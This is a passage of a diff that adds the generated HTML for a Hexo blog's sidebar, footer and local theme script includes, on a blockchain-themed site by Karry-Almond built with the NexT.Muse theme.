fund</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Mapping"><span class="nav-number">1.3.4.</span> <span class="nav-text">Mapping</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Donation"><span class="nav-number">1.3.5.</span> <span class="nav-text">Donation</span></a></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Karry-Almond</p>
+  <div class="site-description" itemprop="description">区块链</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">9</span>
+          <span class="site-state-item-name">المقالات</span>
+        </a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Karry-Almond</span>
+</div>
+  <div class="powered-by">تطبيق الموقع <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
